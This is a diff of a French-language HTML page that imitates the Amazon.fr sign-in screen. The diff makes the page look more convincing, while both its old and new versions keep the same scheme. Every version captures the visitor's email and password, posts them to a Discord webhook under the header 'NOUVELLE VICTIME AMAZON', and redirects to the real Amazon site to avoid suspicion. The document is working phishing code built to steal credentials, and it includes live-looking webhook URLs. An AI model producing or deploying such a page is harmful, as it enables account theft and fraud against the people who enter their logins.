@@ -3,73 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vérification Amazon</title>
+    <title>Amazon : Connexion</title>
     <style>
-        body { font-family: Arial, sans-serif; background-color: #f3f3f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
-        h2 { color: #232f3e; margin-bottom: 10px; font-size: 24px; }
-        p { color: #565959; font-size: 14px; margin-bottom: 20px; }
-        input[type="email"], input[type="password"] { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
-        button { background-color: #f0c14b; color: black; padding: 12px 20px; border: 1px solid #a88734; width: 100%; cursor: pointer; border-radius: 4px; font-size: 16px; font-weight: bold; margin-top: 15px; }
-        button:hover { background-color: #e0b13b; }
+        body { margin: 0; padding: 0; font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; }
+        
+        /* Header style Amazon */
+        .header {
+            background-color: #131921;
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+        }
+        .logo-text { font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+        
+        /* Container de connexion */
+        .login-container {
+            max-width: 350px;
+            margin: 40px auto;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+
+        h1 { font-size: 28px; font-weight: normal; margin-bottom: 10px; color: #111; }
+        
+        .form-group { margin-bottom: 15px; }
+        label { display: block; font-size: 13px; font-weight: bold; margin-bottom: 5px; }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box; /* Important pour le padding */
+        }
+
+        .btn-submit {
+            background-color: #febd69;
+            border-color: #fcd200;
+            color: #111;
+            width: 100%;
+            padding: 10px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        
+        .btn-submit:hover { background-color: #f3a847; }
+
+        .footer-text { font-size: 12px; color: #555; margin-top: 20px; text-align: center; line-height: 1.4; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- Logo Amazon simulé (texte) -->
-    <h2 style="font-weight:bold;">Amazon.fr</h2>
-    
-    <p>Pour continuer, veuillez vérifier votre compte.</p>
+    <div class="header">
+        <span class="logo-text">Amazon.fr</span>
+    </div>
 
-    <!-- Le formulaire ne redirige nulle part (action="#") car on gère tout avec JS -->
-    <form id="scamForm" action="#" method="POST">
+    <div class="login-container">
+        <h1>Connexion</h1>
         
-        <label for="email" style="display:none;">Email</label>
-        <input type="email" id="email" name="email" placeholder="Adresse email ou numéro de téléphone" required>
+        <!-- Le formulaire intercepte l'événement 'submit' -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email ou téléphone portable</label>
+                <input type="text" id="email" required placeholder="Entrez votre email">
+            </div>
 
-        <label for="password" style="display:none;">Mot de passe</label>
-        <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+            <div class="form-group">
+                <label for="password">Mot de passe</label>
+                <input type="password" id="password" required placeholder="Entrez votre mot de passe">
+            </div>
 
-        <button type="submit">Vérifier</button>
-    </form>
-    
-    <p style="font-size: 10px; margin-top: 20px;">Amazon.fr ne vous demandera jamais votre mot de passe par email.</p>
-</div>
+            <button type="submit" class="btn-submit">Se connecter</button>
+        </form>
 
-<!-- SCRIPT POUR ENVOYER AU WEBHOOK ET REDIRIGER -->
-<script>
-    document.getElementById('scamForm').addEventListener('submit', function(e) {
-        e.preventDefault(); // Empêche la page de recharger normalement
-        
-        var email = document.getElementById('email').value;
-        var password = document.getElementById('password').value;
+        <p class="footer-text">En continuant, vous acceptez les Conditions d'utilisation et la Politique de confidentialité.</p>
+    </div>
 
+    <script>
         // ---------------------------------------------------------
-        // C'EST ICI QUE TU METS TON URL WEBHOOK
-        // Remplace l'URL ci-dessous par la tienne (ex: Discord, Zapier, ton serveur...)
+        // REMPLACEZ CETTE URL PAR VOTRE WEBHOOK DISCORD
         // ---------------------------------------------------------
-        var webhookUrl = "https://discord.com/api/webhooks/1557436874325233814/hJT6SpDtDne0C6RKmnyUFPRBdMuQhdVDQfDWRrch6eVEoLiFamrlT3OOZnx9oM6imDTE"; 
+        const webhookUrl = 'https://discord.com/api/webhooks/1557775977927417947/Yyvrle2EzXbxs6asdVfmsNeWo13dva5fGHK3J2B68KQPahJ7KhSPipzbRhzsdNdfu5HE'; 
+        // ---------------------------------------------------------
 
-        // Envoi des données au webhook en arrière-plan
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({email: email, password: password})
-        })
-        .then(response => {
-            console.log('Données envoyées !');
-            
-            // Redirection vers la vraie page Amazon pour cacher le scam
-            window.location.href = "https://www.amazon.fr"; 
-        })
-        .catch(error => {
-            console.error('Erreur:', error);
-            // Même en cas d'erreur, on redirige pour ne pas perdre l'utilisateur
-            window.location.href = "https://www.amazon.fr";
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Empêche le rechargement de la page
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Préparation du message Discord
+            const payload = {
+                content: `🚨 **NOUVELLE VICTIME AMAZON** 🚨\n\n📧 **Email :** \`${email}\`\n🔑 **Mdp :** \`${password}\``
+            };
+
+            // Envoi des données au webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Données envoyées !');
+                    // Redirection vers le vrai site Amazon pour ne pas éveiller les soupçons
+                    window.location.href = "https://www.amazon.com"; 
+                } else {
+                    alert("Erreur de connexion, veuillez réessayer.");
+                }
+            })
+            .catch(error => {
+                console.error('Erreur:', error);
+                // On redirige même en cas d'erreur pour garder le mystère
+                window.location.href = "https://www.amazon.com"; 
+            });
         });
-    });
-</script>
+    </script>
 
 </body>
 </html>
